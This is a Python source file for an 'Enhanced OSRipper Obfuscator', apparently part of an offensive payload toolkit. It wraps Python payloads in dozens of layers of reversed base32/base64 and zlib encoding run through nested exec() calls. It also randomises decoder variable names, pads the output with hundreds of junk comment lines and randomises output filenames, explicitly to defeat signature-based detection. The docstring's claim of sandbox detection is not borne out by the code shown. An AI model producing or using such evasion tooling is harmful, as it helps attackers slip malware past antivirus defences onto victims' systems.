#!/usr/bin/env python3
"""
Enhanced OSRipper Obfuscator v2.0
Same as basic obfuscator but with sandbox detection
"""

import os
import sys
import zlib
import base64
import random
import secrets
import string

# Encoding functions (OSRipper-0.3 compatible)
zlb = lambda in_ : zlib.compress(in_)
b32 = lambda in_ : base64.b32encode(in_)
b64 = lambda in_ : base64.b64encode(in_)


def _random_name(length=2):
    """Random identifier to avoid fixed decoder signatures."""
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))


def _random_decoder(encoding):
    """Build decoder line (b32 or b64) with random variable names and one of several forms."""
    dec_var = _random_name(random.randint(2, 4))
    arg_var = _random_name(random.randint(2, 4))
    while arg_var == dec_var:
        arg_var = _random_name(random.randint(2, 4))
    decode_fn = 'b32decode' if encoding == 'b32' else 'b64decode'
    style = random.randint(0, 2)
    if style == 0:
        return (
            f"{dec_var}=lambda {arg_var}:__import__('zlib').decompress(__import__('base64').{decode_fn}({arg_var}[::-1]));",
            dec_var,
        )
    if style == 1:
        z, b = _random_name(1), _random_name(1)
        while b == z:
            b = _random_name(1)
        return (
            f"{z}=__import__('zlib');{b}=__import__('base64');{dec_var}=lambda {arg_var}:{z}.decompress({b}.{decode_fn}({arg_var}[::-1]));",
            dec_var,
        )
    m = _random_name(1)
    return (
        f"{m}=__import__('base64');{dec_var}=lambda {arg_var}:__import__('zlib').decompress(getattr({m},'{decode_fn}')({arg_var}[::-1]));",
        dec_var,
    )


class FileSize:
    def datas(self, z):
        for x in ['Byte', 'KB', 'MB', 'GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z, x)
            z /= 1024.0
    
    def __init__(self, path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            print('\n')
            print(" [-] Encoded File Size : %s\n" % self.datas(dts))

def add_random_padding(code):
    """
    Add random comment lines throughout the code to randomize file size.
    Adds between 500-1000 comment lines at random positions with random strings.
    """
    import secrets
    import string
    
    # Split code into lines
    lines = code.split('\n')
    total_lines = len(lines)
    
    # Generate random number of padding lines to add (500-1000)
    num_padding_lines = random.randint(500, 1000)
    
    # Generate all padding lines at once with random strings
    padding_lines = []
    for _ in range(num_padding_lines):
        # Random length for the comment string
        str_length = random.randint(10, 80)
        # Generate random string using letters, digits, and some punctuation
        random_str = ''.join(secrets.choice(string.ascii_letters + string.digits + ' _-') for _ in range(str_length))
        comment = '# ' + random_str
        padding_lines.append(comment)
    
    # Determine random positions to insert padding
    # We'll insert padding after random lines
    positions = sorted(random.sample(range(total_lines), min(total_lines, num_padding_lines // 10)))
    
    # Insert padding in chunks at random positions
    offset = 0
    padding_index = 0
    
    for pos in positions:
        # Insert a random chunk of padding lines
        chunk_size = random.randint(5, 50)
        if padding_index + chunk_size > num_padding_lines:
            chunk_size = num_padding_lines - padding_index
        
        if chunk_size > 0:
            # Insert the chunk after this position
            insert_pos = pos + offset
            for i in range(chunk_size):
                if padding_index < num_padding_lines:
                    lines.insert(insert_pos + i, padding_lines[padding_index])
                    padding_index += 1
            offset += chunk_size
        
        if padding_index >= num_padding_lines:
            break
    
    # Add any remaining padding at the end
    while padding_index < num_padding_lines:
        lines.append(padding_lines[padding_index])
        padding_index += 1
    
    return '\n'.join(lines)

def Encode(data, output):
    """
    Encode data with multiple layers of b32/b64/zlib compression.
    Enhanced version with sandbox detection and double-layer encoding from OSRipper-0.3.
    Each encoding type gets its own random layer count.
    """
    # Generate independent random layer counts for each encoding type
    loop_b32 = random.randint(30, 60)
    loop_b64 = random.randint(30, 60)
    
    import re
    
    # Add random padding to randomize file size
    print("[*] Adding random padding to payload...")
    data = add_random_padding(data)
    print("[+] Random padding added")
    
    # OSRipper-0.3 double-layer encoding with randomized decoder signatures
    heading1, dec1 = _random_decoder('b32')
    heading2, dec2 = _random_decoder('b64')
    x1 = "b32(zlb(data.encode('utf8')))[::-1]"
    x2 = "b64(zlb(data.encode('utf8')))[::-1]"
    print(f"[*] Applying {loop_b32} layers of b32+zlib encoding...")
    for x in range(loop_b32):
        try:
            data = "exec((%s)(%s))" % (dec1, repr(eval(x1)))
        except TypeError as s:
            sys.exit(" TypeError : " + str(s))
    ab = heading1 + "\n" + data
    for x in range(loop_b64):
        try:
            data = "exec((%s)(%s))" % (dec2, repr(eval(x2)))
        except TypeError as s:
            sys.exit(" TypeError : " + str(s))
    abc = heading2 + "\n" + ab
    
    # Write final encoded payload
    with open(output, 'w') as f:
        f.write(abc)
        f.close()
    
    print(f"[+] Double-layer encoding complete: {loop_b32}x b32 + {loop_b64}x b64 = {loop_b32 + loop_b64} total layers")

def MainMenu(file, random_suffix=False):
    """
    Main obfuscation entry point. If random_suffix=True, output name is randomized to reduce filename signatures.
    Returns the output filename (basename).
    """
    try:
        data = open(file).read()
    except IOError:
        sys.exit("\n File Not Found!")
    base = file.lower().replace('.py', '')
    if random_suffix:
        output = base + "_" + secrets.token_hex(2) + ".py"
    else:
        output = base + "_or.py"
    print("Starting advanced OSRipper-0.3 double-layer obfuscation (each layer: 30-60 random iterations)...")
    Encode(data, output)
    print("Random padding applied (randomizes file size)")
    FileSize(output)
    return output

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python obfuscator_enhanced.py <file.py>")
        sys.exit(1)
    MainMenu(sys.argv[1])

